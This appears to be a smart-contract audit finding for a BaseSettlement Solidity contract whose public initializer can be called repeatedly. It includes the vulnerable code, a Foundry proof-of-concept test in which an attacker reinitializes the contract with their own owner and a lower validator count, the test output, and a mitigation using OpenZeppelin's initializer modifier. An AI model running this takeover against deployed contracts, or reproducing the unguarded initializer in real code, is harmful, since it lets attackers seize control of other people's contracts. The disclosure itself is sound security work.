# Vulnerability details

## Description
The BaseSettlement contract contains an initialization function _Settlement_init that lacks protection against multiple calls/ multiple initialization. The function sets critical contract parameters but can be called repeatedly, allowing an attacker to override essential contract state.
Vulnerable code snippet:
```
function _Settlement_init(
        string memory _chain_name,
        uint256 _chain_id,
        address _owner,
        address[] memory _managers,
        uint256 _required_validators,
        address _signature_verifier
    ) public {
        __Ownable_init(_owner);
        __UUPSUpgradeable_init();
        _grantRole(DEFAULT_ADMIN_ROLE, _owner);

        for (uint256 i = 0; i < _managers.length; i++) {
            _grantRole(MANAGER_ROLE, _managers[i]);
        }

        chain_id = _chain_id;
        contract_chain_name = _chain_name;
        required_validators = _required_validators;
        signature_verifier = ISettlementSignatureVerifier(_signature_verifier);
    }
```


## Impact
An attacker can repeatedly call this function to modify the existing state and reinitialize the contract multiple times.

## POC
The provided PoC demonstrates this vulnerability:

1. It initializes the contract with initial values (chain_id: 1, required_validators: 3).
2. It then reinitializes the contract with different values (chain_id: 999, required_validators: 1).
3. The test confirms that the contract state is successfully altered after reinitialization.


Key output from the PoC:
```
Initial chain_id: 1.0
Initial required_validators: 3.0
Reinitialized chain_id: 999.0
Reinitialized required_validators: 1.0
```

Here is the test funtion
```
    function testReinitializationVulnerability() public {
        // Initial setup
        settlement._Settlement_init("Chain1", 1, owner, managers, 3, address(mockVerifier));
        
        emit log_named_decimal_uint("Initial chain_id", settlement.chain_id(), 0);
        emit log_named_decimal_uint("Initial required_validators", settlement.required_validators(), 0);

        // Attacker reinitializes with different values
        address[] memory attackerManagers;
        settlement._Settlement_init("AttackerChain", 999, attacker, attackerManagers, 1, address(mockVerifier));

        emit log_named_decimal_uint("Reinitialized chain_id", settlement.chain_id(), 0);
        emit log_named_decimal_uint("Reinitialized required_validators", settlement.required_validators(), 0);

        // Assert the changes
        assertEq(settlement.chain_id(), 999, "Chain ID should be changed");
        assertEq(settlement.required_validators(), 1, "Required validators should be changed");
        assertEq(settlement.contract_chain_name(), "AttackerChain", "Chain name should be changed");
    }
}
```

## Recommended Mitigation Steps
Use the initializer modifier from OpenZeppelin's Initializable contract. This is the recommended approach for securing initialization functions in upgradeable contracts.
